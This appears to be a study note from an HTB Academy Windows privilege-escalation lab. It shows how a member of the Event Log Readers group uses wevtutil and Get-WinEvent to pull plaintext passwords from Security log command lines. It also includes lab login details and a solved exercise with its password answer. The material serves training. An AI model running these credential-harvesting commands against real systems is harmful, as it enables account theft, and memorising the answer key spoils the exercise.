# Event Log Readers
Administrators or members of the `Event Log Readers` group have permission to access this log.

## Confirming Group Membership

```cmd
C:\htb> net localgroup "Event Log Readers"

Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members

-------------------------------------------------------------------------------
logger
The command completed successfully.
```

## Searching Security Logs Using wevtutil
We can query Windows events from the command line using the wevtutil utility and the Get-WinEvent PowerShell cmdlet.

```pwsh
PS C:\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

## Passing Credentials to wevtutil
We can also specify alternate credentials for `wevtutil` using the parameters `/u` and `/p`. In this example, we filter for process creation events (4688), which contain `/user` in the process command line.

```pwsh
C:\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

> Note: Searching the `Security` event log with Get-WInEvent requires administrator access or permissions adjusted on the registry key `HKLM\System\CurrentControlSet\Services\Eventlog\Security`. Membership in just the `Event Log Readers` group is not sufficient.

## Searching Security Logs Using Get-WinEvent

```pwsh
PS C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

The cmdlet can also be run as another user with the `-Credential` parameter.

Other logs include `PowerShell Operational` log, which may also contain sensitive information or credentials if script block or module logging is enabled. This log is accessible to unprivileged users.

## Questions
RDP to 10.129.87.147 (ACADEMY-WINLPE-SRV01), with user `logger` and password `HTB_@cademy_stdnt!`
1. Using the methods demonstrated in this section find the password for the user mary. **Answer: W1ntergreen_gum_2021!**
   - Check for event log readers privilege then try to read the Security logs for mary's password:
        ```pwsh
        PS C:\Users\logger> net localgroup "Event Log Readers"
        Alias name     Event Log Readers
        Comment        Members of this group can read event logs from local machine

        Members

        -------------------------------------------------------------------------------
        logger
        The command completed successfully.

        PS C:\Users\logger> wevtutil qe Security /rd:true /f:text | Select-String "/user"

                Process Command Line:   cmdkey  /add:WEB01 /user:amanda /pass:Passw0rd!
                Process Command Line:   net  use Z: \\DB01\scripts /user:mary W1ntergreen_gum_2
                Process Command Line:   net  use T: \\fs01\backups /user:tim MyStr0ngP@ssword
        ```